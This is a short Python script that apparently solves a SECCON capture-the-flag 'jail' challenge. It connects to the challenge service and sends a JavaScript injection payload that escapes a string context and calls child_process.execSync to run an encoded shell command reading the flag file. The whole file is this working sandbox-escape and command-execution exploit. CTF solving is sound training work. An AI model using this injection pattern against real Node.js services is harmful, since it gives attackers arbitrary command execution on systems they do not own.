import ptrlib
import os
import base64

io = ptrlib.Socket(
    os.getenv("SECCON_HOST", "localhost"),
    int(os.getenv("SECCON_PORT", 5000)),
)
io.debug = True

cmd = b"cat /flag-*"
code = f"""
/"; console.log(process.getBuiltinModule("child_process").execSync(atob("{base64.b64encode(cmd).decode()}")).toString()); "/
""".strip()

io.sendlineafter(b"jail> ", code.encode())
print(io.recvline().decode().split())
